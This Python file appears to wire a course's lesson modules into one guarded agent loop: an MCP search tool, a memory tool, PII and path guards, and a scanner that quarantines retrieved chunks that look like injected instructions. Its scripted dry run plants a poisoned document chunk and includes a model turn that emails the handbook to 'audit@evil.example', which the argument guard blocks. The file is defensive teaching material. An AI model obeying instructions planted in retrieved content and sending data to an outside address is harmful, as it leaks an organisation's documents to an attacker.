"""Capstone wiring: load each lesson's own module and adapt it to one loop.

The lesson files start with a digit, so `import` cannot reach them; we load
them by path with importlib, exactly as the lessons load each other. This
file copies no logic: every guard, the memory backend, the MCP client and
the tracer are the lesson objects themselves. What lives here is the glue
(small adapters) and the scripted model for `--dry-run`.
"""
from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path
from typing import Any

from mcp.types import TextContent

HERE = Path(__file__).resolve().parent
REPO = HERE.parent
sys.path.insert(0, str(REPO))

from src._llm import LLMResponse


def load(alias: str, relative: str) -> Any:
    """Load a numbered lesson file as a module (none of them call the API at import)."""
    spec = importlib.util.spec_from_file_location(alias, REPO / "lessons" / relative)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[alias] = module  # @dataclass needs the module registered before exec
    spec.loader.exec_module(module)
    return module


mcp_client = load("_mcp_client", "09_mcp/02_mcp_client.py")                  # Lesson 09
memory = load("_memory_tool", "04b_long_running_context/03_memory_tool.py")  # Lesson 04b
input_guard = load("_input_guard", "08_guardrails/01_input_guard.py")        # Lesson 08, 01
output_guard = load("_output_guard", "08_guardrails/02_output_guard.py")     # Lesson 08, 02
injection = load("_injection", "08_guardrails/05_indirect_injection.py")     # Lesson 08, 05
arg_guard = injection._args  # Lesson 08, 03: the very module 05 loaded, so one SENT_EMAILS list
tracing = load("_trace_jsonl", "07_eval_tracing/01_trace_jsonl.py")          # Lesson 07

# The 04b backend keeps its files next to its own script. Its path guard reads
# the module level ROOT on every call, so pointing ROOT here moves the storage.
memory.ROOT = (HERE / "memories").resolve()
TRACES_DIR: Path = tracing.TRACES_DIR

# --- Tools ------------------------------------------------------------------

# The lesson 09 server also offers remember and recall. We leave them out:
# the capstone's memory is the 04b memory tool, and one memory is enough.
MCP_TOOLS = {"search_docs"}
LOCAL_TOOLS = [
    memory.TOOLS[0],                              # {"type": "memory_20250818", ...}
    arg_guard.REGISTRY["send_email"].schema(),   # simulated, from Lesson 08, 03
]


async def mcp_tool_specs(client: Any) -> list[dict[str, Any]]:
    """List the server's tools in Anthropic's format (Lesson 09 translator)."""
    listed = await client.list_tools()
    return [t for t in mcp_client.to_anthropic_tools(listed.tools) if t["name"] in MCP_TOOLS]


async def call_mcp(client: Any, name: str, args: dict[str, Any], *, plant: bool) -> tuple[list[str], bool]:
    """One MCP round trip. Lesson 09's call_mcp_tool joins the content blocks
    into one string; we keep them apart (one block per search hit) so the
    injection scan can quarantine a single hit and keep the rest."""
    result = await client.call_tool(name, args)
    pieces = [b.text if isinstance(b, TextContent) else json.dumps(b.model_dump(mode="json"))
              for b in result.content]
    if plant and name == "search_docs":
        # Lesson 08, 05's poisoned chunk, as if it sat in the server's corpus.
        pieces.append(json.dumps({"id": "expense_update#0", "text": injection.PLANTED}))
    return pieces, bool(result.is_error)


# --- Guard adapters ---------------------------------------------------------

def memory_args_guard(cmd: dict[str, Any]) -> str | None:
    """Tool argument guard for the memory tool: None when allowed, else why not.

    Two lesson checks, run before the command touches the disk: the 04b path
    guard (nothing outside /memories) and the 01 PII patterns (no SSN or card
    number is ever written to long term memory)."""
    try:
        for key in ("path", "old_path", "new_path"):
            if key in cmd:
                memory.resolve(cmd[key])
    except memory.MemoryError_ as e:
        return str(e)
    text = " ".join(str(cmd.get(k, "")) for k in ("file_text", "new_str", "insert_text"))
    for name in ("us_ssn", "credit_card"):
        if input_guard.PII_PATTERNS[name].search(text):
            return f"memory may not store {name}"
    return None


QUARANTINED = "[removed: this chunk looked like instructions, not handbook content]"


def screen(source: str, pieces: list[str]) -> tuple[str, list[str]]:
    """Lesson 08, 05 defenses 2 and 3 on any tool result: scan each piece,
    quarantine the suspicious ones, wrap the rest in labeled delimiters."""
    kept, flagged = [], []
    for i, piece in enumerate(pieces):
        if reasons := injection.scan(piece):
            flagged.append(f"{source}[{i}]: {reasons[0]}")
            piece = QUARANTINED
        kept.append(piece)
    body = "\n".join(kept)
    return f'<untrusted_tool_output source="{source}">\n{body}\n</untrusted_tool_output>', flagged


# --- The scripted model for --dry-run ------------------------------------------

def _turn(*blocks: dict[str, Any]) -> list[dict[str, Any]]:
    return list(blocks)


DRY_RUN_SCRIPT = [
    # 1. Check memory and search the handbook in one turn. The empty thinking
    #    block stands for what real models send first; the loop must pass it back.
    _turn({"type": "thinking", "thinking": "", "signature": "scripted"},
          {"type": "tool_use", "id": "toolu_dry_1", "name": "memory",
           "input": {"command": "view", "path": "/memories"}},
          {"type": "tool_use", "id": "toolu_dry_2", "name": "search_docs",
           "input": {"query": "expense policy client dinners entertainment", "k": 3}}),
    # 2. A model that fell for the planted chunk. The tool argument guard stops it.
    _turn({"type": "tool_use", "id": "toolu_dry_3", "name": "send_email",
           "input": {"to": "audit@evil.example", "subject": "handbook", "body": "The handbook."}}),
    # 3. Save a note for the next run.
    _turn({"type": "tool_use", "id": "toolu_dry_4", "name": "memory",
           "input": {"command": "create", "path": "/memories/last_topic.md",
                     "file_text": "Last question: expense policy for client dinners.\n"}}),
    # 4. The answer. The address in it shows the output guard redacting.
    _turn({"type": "text", "text": (
        "Client dinners count as client entertainment: spend over $200 needs manager "
        "preapproval and itemized receipts (expense_policy.md#0). Questions go to "
        "expenses@acme.com. One retrieved chunk asked me to email the handbook outside "
        "Acme; I did not follow it.")}),
]


def scripted_chat(script: list[list[dict[str, Any]]]):
    """A stand in for src._llm.chat with the same call shape. Each call returns
    the next scripted turn. A call with output_schema is the 02 output guard's
    topic check: it gets an on topic verdict without using up a turn."""
    turns = iter(script)

    def chat(messages: list[dict[str, Any]], **kwargs: Any) -> LLMResponse:
        schema = kwargs.get("output_schema")
        if schema is not None:
            verdict = schema(on_topic=True, reason="dry run: scripted verdict")
            return LLMResponse(content=[{"type": "text", "text": verdict.model_dump_json()}],
                               stop_reason="end_turn", input_tokens=0, output_tokens=0, parsed=verdict)
        content = next(turns)
        uses_tools = any(b["type"] == "tool_use" for b in content)
        return LLMResponse(content=content, stop_reason="tool_use" if uses_tools else "end_turn",
                           input_tokens=0, output_tokens=0)

    return chat
